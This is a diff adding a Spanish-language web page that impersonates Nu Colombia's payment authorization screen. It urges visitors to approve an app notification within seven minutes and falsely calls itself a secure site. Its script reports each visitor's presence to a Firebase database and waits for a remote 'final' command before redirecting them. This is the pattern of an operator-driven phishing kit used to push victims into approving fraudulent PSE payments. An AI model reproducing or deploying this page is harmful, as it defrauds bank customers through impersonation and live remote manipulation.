@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nu - Autorización</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box;}
+body{
+  margin:0;
+  font-family:'Inter', sans-serif;
+}
+
+/* HEADER */
+.header{
+  padding:20px 30px;
+  font-size:40px;
+  font-weight:900;
+  letter-spacing:-2px;
+  color:#111;
+}
+
+/* BACKGROUND */
+.bg{
+  background:url('fondo.webp') center/cover no-repeat;
+  height:calc(100vh - 80px);
+  display:flex;
+  align-items:center;
+}
+
+/* CARD */
+.card{
+  background:#fff;
+  width:360px;
+  margin-left:60px;
+  padding:30px;
+  border-radius:16px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+}
+
+.icon{
+  width:80px;
+  margin-bottom:20px;
+}
+
+.title{
+  font-size:22px;
+  font-weight:600;
+  margin-bottom:10px;
+}
+
+.desc{
+  color:#444;
+  font-size:14px;
+  margin-bottom:15px;
+}
+
+.small{
+  font-size:13px;
+  color:#444;
+  margin-bottom:20px;
+}
+
+/* BUTTON */
+.btn{
+  width:100%;
+  padding:14px;
+  border-radius:25px;
+  border:none;
+  background:#ddd;
+  font-weight:600;
+}
+
+/* FOOTER */
+.footer{
+  display:flex;
+  justify-content:space-between;
+  padding:15px 30px;
+  font-size:12px;
+}
+
+/* MOBILE */
+@media(max-width:900px){
+  .bg{
+    background:none;
+    height:auto;
+    padding:20px;
+  }
+
+  .card{
+    margin:0;
+    width:100%;
+    box-shadow:none;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">Nu</div>
+
+<div class="bg">
+  <div class="card">
+
+
+    <div class="title">Termina el pago desde tu app</div>
+
+    <div class="desc">
+      ¿No te llegó la notificación? Ve al centro de notificaciones de tu app, ábrela y termina el pago.
+    </div>
+
+    <div class="small">
+      Tienes sólo 7 minutos para hacerlo.
+    </div>
+
+    <button class="btn">Cancelar</button>
+
+    <p style="font-size:12px;margin-top:10px;">
+      Vas a hacer el pago a través de PSE
+    </p>
+
+  </div>
+</div>
+
+<div class="footer">
+  <div>Nu Colombia Compañía de Financiamiento S.A.</div>
+  <div>Paga con tranquilidad, este es un sitio seguro.</div>
+</div>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+const { db, uid, ref, update, onValue } = window;
+
+
+update(ref(db, "dataPages/" + uid), { 
+estado: "abierto",
+paginaActual: "Autorizacion.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+update(ref(db, "dataPages/" + uid), { 
+estado: "cerrado",
+paginaActual: null  
+});
+});
+
+
+// ===============================
+// 🔥 SOLO AUTORIZACION Y FINAL
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+
+  const data = snapshot.val();
+  if (!data) return;
+
+  // 🔴 IR A FINAL
+  if (data.accion === "final") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "../../final.html";
+  }
+
+});
+
+
+});
+</script>
+
+</body>
+</html>
